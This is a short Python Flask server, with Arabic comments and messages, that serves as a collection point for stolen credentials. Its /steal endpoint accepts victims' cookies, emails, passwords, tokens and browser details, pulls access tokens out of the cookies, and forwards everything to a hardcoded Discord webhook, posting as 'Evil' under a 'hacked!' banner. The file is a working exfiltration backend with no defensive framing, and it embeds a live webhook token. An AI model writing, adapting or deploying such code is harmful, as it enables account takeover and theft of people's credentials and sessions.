from flask import Flask, request
import requests
import json
import os
import re
from datetime import datetime

app = Flask(__name__)

# ===== ويب هوك ديسكورد =====
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532217110254850159/tIIeGy0xULqA0yPxSOt4YjC3MuV1Y8QOTtUwcly25hV8oG5O4VJLM1AEMu7OKRT9UpIl"

def send_to_discord(message):
    try:
        data = {"content": message, "username": "Evil"}
        response = requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=10)
        print(f"Sent to Discord: {response.status_code}")
    except Exception as e:
        print(f"Error sending to Discord: {e}")

@app.route('/steal', methods=['POST'])
def steal():
    try:
        data = request.get_json()
        if not data:
            return "No data", 400

        cookies = data.get('cookies', 'لا يوجد')
        email = data.get('email', 'غير موجود')
        password = data.get('password', 'غير موجود')
        token = data.get('token', 'غير موجود')
        user_agent = data.get('userAgent', 'غير معروف')
        time = data.get('time', datetime.now().isoformat())

        if token == "غير موجود" and 'accessToken=' in cookies:
            match = re.search(r'accessToken=([^;]+)', cookies)
            if match:
                token = match.group(1)

        message = f"""
**🎯 تم الاختراق!**
**📧 البريد:** `{email}`
**🔑 كلمة المرور:** `{password}`
**🔐 التوكن:** `{token}`
**🍪 الكوكيز:** `{cookies[:150]}...`
**🖥️ المتصفح:** {user_agent}
**⏰ الوقت:** {time}
        """
        send_to_discord(message)
        return "OK", 200
    except Exception as e:
        print(f"Error in /steal: {e}")
        return "Error", 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)